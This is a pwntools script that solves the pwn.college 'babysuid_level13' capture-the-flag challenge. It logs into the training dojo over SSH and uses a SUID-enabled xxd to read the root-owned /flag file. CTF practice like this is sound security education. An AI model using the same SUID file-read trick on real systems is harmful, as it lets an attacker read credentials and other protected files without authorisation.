from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level13 to make /usr/bin/xxd SUID
s.process("/challenge/babysuid_level13")

# Start a bash shell
sh = s.shell()

# Send the command to run /usr/bin/xxd /flag
# ? The first xxd command encodes the flag to hex
# ? Pipe to xxd with "-r" to "reverse" the hex encoding and get the flag
sh.sendline(b"xxd /flag | xxd -r")
sh.recvuntil(b"pwn.college")

# Receive the output
log.success(f"FLAG: pwn.college{sh.recvline().decode().strip()}")

# Close the SSH connection
s.close()
